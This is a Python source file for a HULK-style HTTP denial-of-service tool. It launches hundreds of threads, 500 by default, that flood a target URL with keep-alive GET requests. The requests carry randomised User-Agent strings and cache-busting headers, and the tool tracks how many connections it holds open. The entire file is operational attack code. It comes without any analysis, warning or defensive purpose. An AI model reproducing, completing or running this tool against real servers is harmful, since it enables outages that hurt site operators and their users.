
import random
import socket
import errno
from abc import ABCMeta, abstractmethod

from lib.utils import ConnectionList
from lib.threads import MonitoredThread, Monitor
from lib.http import ActiveHTTPClient
from lib.attack import Attack, AttackOption
from lib.commandline import main

user_agents = open('user-agents.txt').read().split('\n')


# TODO: Add some keep-alive time stratagy.
class KeepAliveStrategy:
    __meta__ = ABCMeta

    def __init__(self, hulkthread):
        self.hulk = hulkthread

    @abstractmethod
    def time(self):
        pass


class RandomStrategy(KeepAliveStrategy):
    def time(self):
        return random.randint(110, 120)


class HulkMonitor(Monitor):
    def connections_count(self):
        return sum([len(t.connections) for t in self.threads])


class HulkThread(MonitoredThread):
    def __init__(self, monitor, keep_alive, url, *args, **kwargs):
        MonitoredThread.__init__(self, monitor, *args, **kwargs)
        self.url = url
        self.client = ActiveHTTPClient()
        self.keep_alive_strategy = keep_alive(self)
        self.connections = ConnectionList()

        self.client.add_default_headers({
            'User-Agent': self.user_agent(),
            'Cache-Control': 'no-cache',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Connection': 'keep-alive'
        })

    def user_agent(self):
        return random.choice(user_agents)

    def keep_alive(self):
        return self.keep_alive_strategy.time()

    def loop(self):
        try:
            self.connections.append(self.client.get(self.url, {
                'Keep-Alive': self.keep_alive()
            }))

            print '%d Connections' % self.monitor.connections_count()
        except socket.error, e:
            if e.errno == errno.ECONNREFUSED:
                print str(e)
                self.monitor.stop()


class HulkAttack(Attack):
    options = [
        AttackOption(
            'threads',
            AttackOption.REQUIRED_ARGUMENT,
            default=500,
            parser=int
        )
    ]

    def __init__(self, url, **kwargs):
        self.monitor = HulkMonitor()
        self.url = url
        self.threads = kwargs.get('threads')

    def attack(self):
        for _ in range(self.threads):
            HulkThread(self.monitor, RandomStrategy, self.url).start()


if __name__ == '__main__':
    main(HulkAttack)
